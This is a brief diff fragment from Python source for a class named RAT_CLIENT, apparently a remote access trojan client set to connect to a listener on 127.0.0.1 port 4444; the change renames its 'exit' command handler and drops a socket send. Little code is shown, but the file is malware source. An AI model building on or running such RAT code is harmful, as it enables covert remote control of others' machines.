@@ -600,8 +600,7 @@ User: {os.getlogin()}
                 except:
                     self.errorsend()
 
-            elif command == 'exit':
-                s.send(b"exit")
+            elif command == 'exitt':
                 break
 
 rat = RAT_CLIENT('127.0.0.1', 4444)
